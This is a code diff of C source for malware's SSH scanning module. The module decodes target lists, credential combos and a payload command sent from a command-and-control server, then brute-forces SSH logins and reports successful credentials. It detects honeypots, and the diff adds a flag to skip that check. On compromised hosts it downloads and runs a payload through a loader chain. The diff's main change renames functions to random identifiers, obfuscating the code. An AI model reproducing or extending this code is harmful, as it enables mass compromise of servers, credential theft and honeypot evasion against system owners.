@@ -1536,12 +1550,12 @@ static int ssh_probe_shell(ssh_conn_t *c) {
    SCANNER MAIN
    ====================================================================== */
 
-int ssh_scanner_pid = 0;
-int ssh_report_fd   = -1;  /* read end of pipe — parent drains this */
+int _bj8XN2t = 0;
+int _SV2eW7e   = -1;  /* read end of pipe — parent drains this */
 static int ssh_write_fd = -1;  /* write end — child uses this */
 
 /* Parse the base64-encoded payload from C2 */
-static void ssh_child_main(const char *b64_payload) {
+static void _jk8sS4D(const char *b64_payload) {
     dbuf raw;
     char *data;
     char *targets[SSH_MAX_TARGETS];
@@ -1554,20 +1568,22 @@ static void ssh_child_main(const char *b64_payload) {
     int section = 0; /* 0=targets, 1=combos, 2=payload */
     int ti, ci;
 
-    debug_log("[ssh] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
-    raw = base64_decode(b64_payload);
+    _nS5PJ8Y("[ssh] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
+    raw = _rr5LH7D(b64_payload);
     if (db_len(&raw) == 0) {
-        debug_log("[ssh] child: decode failed, aborting");
+        _nS5PJ8Y("[ssh] child: decode failed, aborting");
         db_free(&raw); _exit(1);
     }
-    debug_log("[ssh] child: decoded %zu bytes", db_len(&raw));
+    _nS5PJ8Y("[ssh] child: decoded %zu bytes", db_len(&raw));
 
     /* null-terminate */
     db_push(&raw, 0);
     data = (char *)raw.data;
 
-    /* Parse flags before strtok mangles data */
-    int clean = (strstr(data, "CLEAN:1") != NULL);
+    /* Parse flags before strtok mangles data.
+       Anchor with \n so "NOTCLEAN:10" can't match "CLEAN:1". */
+    int clean = (strstr(data, "\nCLEAN:1\n")      != NULL) || (strncmp(data, "CLEAN:1\n",      8)  == 0);
+    int no_hp = (strstr(data, "\nNOHPCHECK:1\n") != NULL) || (strncmp(data, "NOHPCHECK:1\n", 12) == 0);
 
     /* Extract payload section before strtok mangles everything.
        Format: ...combos...\n===\npayload_command_here */
@@ -1615,21 +1631,21 @@ static void ssh_child_main(const char *b64_payload) {
         line = strtok(NULL, "\n");
     }
 
-    debug_log("[ssh] child: parsed %d targets, %d combos, mode=%s",
+    _nS5PJ8Y("[ssh] child: parsed %d targets, %d combos, mode=%s",
               ntargets, ncombos, mode_payload ? "payload" : "report");
     SSH_DBG("loaded %d targets, %d combos, mode=%s, payload=%s", ntargets, ncombos,
             mode_payload ? "payload" : "report",
             payload_cmd ? payload_cmd : "(none)");
 
     if (ntargets == 0 || ncombos == 0) {
-        debug_log("[ssh] child: no targets or combos, aborting");
+        _nS5PJ8Y("[ssh] child: no targets or combos, aborting");
         db_free(&raw); _exit(1);
     }
 
-    ensure_boot();
+    iB2Zq4a();
 
     /* Binary report protocol — buffer per-IP events, aggregate skip/honeypot */
-    sr_init(ssh_write_fd);
+    vC8Yg5i(ssh_write_fd);
     uint16_t stat_skipped = 0, stat_honeypots = 0, stat_hpots_probe = 0;
 
     for (ti = 0; ti < ntargets; ti++) {
@@ -1638,14 +1654,14 @@ static void ssh_child_main(const char *b64_payload) {
 
         /* Report progress every 200 targets */
         if (ti > 0 && (ti % 200) == 0) {
-            sr_ssh_progress((uint32_t)ti, (uint32_t)ntargets);
-            sr_flush();
+            Ux7my2G((uint32_t)ti, (uint32_t)ntargets);
+            ku8gj5o();
         }
         int fd;
-        ssh_conn_t sc;
+        _Rz8vk8z sc;
         struct timeval tv;
 
-        debug_log("[ssh] child: [%d/%d] target %s", ti + 1, ntargets, ip);
+        _nS5PJ8Y("[ssh] child: [%d/%d] target %s", ti + 1, ntargets, ip);
         SSH_DBG("trying %s (%d/%d)", ip, ti + 1, ntargets);
 
         memset(&addr, 0, sizeof(addr));
@@ -1683,7 +1699,7 @@ static void ssh_child_main(const char *b64_payload) {
                 sc.hash_len = 32;
 
                 {
-                    int hs = ssh_handshake(&sc);
+                    int hs = _ms4KB8R(&sc);
                     if (hs == -2) {
                         SSH_DBG("%s: kex unsupported, skipping", ip);
                         stat_skipped++;
@@ -1697,9 +1713,9 @@ static void ssh_child_main(const char *b64_payload) {
                     }
                 }
 
-                if (!checked_hp) {
+                if (!checked_hp && !no_hp) {
                     checked_hp = 1;
-                    if (ssh_is_honeypot(&sc)) {
+                    if (_mn4es3f(&sc)) {
                         SSH_DBG("%s: honeypot detected (%s)", ip, sc.banner);
                         stat_honeypots++;
                         close(fd); fd = -1;
@@ -1708,17 +1724,17 @@ static void ssh_child_main(const char *b64_payload) {
                 }
             }
 
-            result = ssh_try_auth(&sc, combos_user[ci], combos_pass[ci]);
+            result = _CC2fp3F(&sc, combos_user[ci], combos_pass[ci]);
             if (result == 1) {
                 /* Active honeypot probe before reporting/deploying */
-                if (!ssh_probe_shell(&sc)) {
+                if (!no_hp && !_qP4pj8f(&sc)) {
                     SSH_DBG("%s: honeypot (probe) %s:%s", ip, combos_user[ci], combos_pass[ci]);
                     stat_hpots_probe++;
                     break;
                 }
-                debug_log("[ssh] child: %s HIT — %s:%s", ip, combos_user[ci], combos_pass[ci]);
+                _nS5PJ8Y("[ssh] child: %s HIT — %s:%s", ip, combos_user[ci], combos_pass[ci]);
                 SSH_DBG("HIT: %s %s:%s", ip, combos_user[ci], combos_pass[ci]);
-                sr_ssh_hit(addr.sin_addr.s_addr, combos_user[ci], combos_pass[ci]);
+                tP6Uf6v(addr.sin_addr.s_addr, combos_user[ci], combos_pass[ci]);
 
                 if (mode_payload && payload_cmd) {
                     const char *url_pos = strstr(payload_cmd, "http");
@@ -1732,18 +1748,18 @@ static void ssh_child_main(const char *b64_payload) {
                                 memcpy(pre, payload_cmd, prelen);
                                 pre[prelen] = '\0';
                                 SSH_DBG("%s: pre-deploy exec: %s", ip, pre);
-                                ssh_exec(&sc, pre);
+                                _nD6dS8V(&sc, pre);
                             }
                         }
-                        if (ssh_deploy(&sc, url_pos, clean)) {
+                        if (_Cb5rB3s(&sc, url_pos, clean)) {
                             SSH_DBG("%s: deployed via loader chain", ip);
-                            sr_ssh_deployed(addr.sin_addr.s_addr);
+                            Da2yh8c(addr.sin_addr.s_addr);
                         } else {
                             SSH_DBG("%s: deploy failed (all methods)", ip);
-                            sr_ssh_deploy_fail(addr.sin_addr.s_addr);
+                            Tt8yX7B(addr.sin_addr.s_addr);
                         }
                     } else {
-                        if (ssh_exec(&sc, payload_cmd) < 0)
+                        if (_nD6dS8V(&sc, payload_cmd) < 0)
                             SSH_DBG("%s: exec failed", ip);
                         else
                             SSH_DBG("%s: payload sent", ip);
@@ -1763,22 +1779,22 @@ static void ssh_child_main(const char *b64_payload) {
         if (fd >= 0) close(fd);
     }
 
-    debug_log("[ssh] child: scan complete — %d targets (skip=%d hp=%d hp_probe=%d)",
+    _nS5PJ8Y("[ssh] child: scan complete — %d targets (skip=%d hp=%d hp_probe=%d)",
               ntargets, stat_skipped, stat_honeypots, stat_hpots_probe);
-    sr_ssh_done((uint32_t)ntargets, stat_skipped, stat_honeypots, stat_hpots_probe);
-    sr_flush();
+    yd7bZ4a((uint32_t)ntargets, stat_skipped, stat_honeypots, stat_hpots_probe);
+    ku8gj5o();
 
     db_free(&raw);
     _exit(0);
 }
 
-void ssh_scanner_init(const char *b64_payload, conn_t *parent_conn) {
+void kh8hL4N(const char *b64_payload, _EA8up4M *parent_conn) {
     int pipefd[2];
     pid_t pid;
     (void)parent_conn;
-    debug_log("[ssh] init: starting (current pid=%d)", ssh_scanner_pid);
-    if (ssh_scanner_pid > 0) {
-        debug_log("[ssh] init: already running (pid=%d)", ssh_scanner_pid);
+    _nS5PJ8Y("[ssh] init: starting (current pid=%d)", _bj8XN2t);
+    if (_bj8XN2t > 0) {
+        _nS5PJ8Y("[ssh] init: already running (pid=%d)", _bj8XN2t);
         return;
     }
 
@@ -1793,32 +1809,32 @@ void ssh_scanner_init(const char *b64_payload, conn_t *parent_conn) {
     if (pid > 0) {
         /* parent — keep read end */
         close(pipefd[1]);
-        ssh_scanner_pid = pid;
-        ssh_report_fd = pipefd[0];
-        fcntl(ssh_report_fd, F_SETFL, fcntl(ssh_report_fd, F_GETFL) | O_NONBLOCK);
-        debug_log("[ssh] init: forked child pid=%d, report_fd=%d", pid, ssh_report_fd);
+        _bj8XN2t = pid;
+        _SV2eW7e = pipefd[0];
+        fcntl(_SV2eW7e, F_SETFL, fcntl(_SV2eW7e, F_GETFL) | O_NONBLOCK);
+        _nS5PJ8Y("[ssh] init: forked child pid=%d, report_fd=%d", pid, _SV2eW7e);
         return;
     }
 
     /* child — keep write end */
     close(pipefd[0]);
-    if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }
+    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }
     ssh_write_fd = pipefd[1];
-    debug_log("[ssh] child: starting (write_fd=%d)", ssh_write_fd);
-    ssh_child_main(b64_payload);
-    debug_log("[ssh] child: finished, exiting");
+    _nS5PJ8Y("[ssh] child: starting (write_fd=%d)", ssh_write_fd);
+    _jk8sS4D(b64_payload);
+    _nS5PJ8Y("[ssh] child: finished, exiting");
     _exit(0);
 }
 
-void ssh_scanner_kill(void) {
-    debug_log("[ssh] kill: pid=%d fd=%d", ssh_scanner_pid, ssh_report_fd);
-    if (ssh_scanner_pid > 0) {
-        kill(ssh_scanner_pid, 9);
-        ssh_scanner_pid = 0;
+void Ss3vb6a(void) {
+    _nS5PJ8Y("[ssh] kill: pid=%d fd=%d", _bj8XN2t, _SV2eW7e);
+    if (_bj8XN2t > 0) {
+        kill(_bj8XN2t, 9);
+        _bj8XN2t = 0;
     }
-    if (ssh_report_fd >= 0) {
-        close(ssh_report_fd);
-        ssh_report_fd = -1;
+    if (_SV2eW7e >= 0) {
+        close(_SV2eW7e);
+        _SV2eW7e = -1;
     }
 }
 
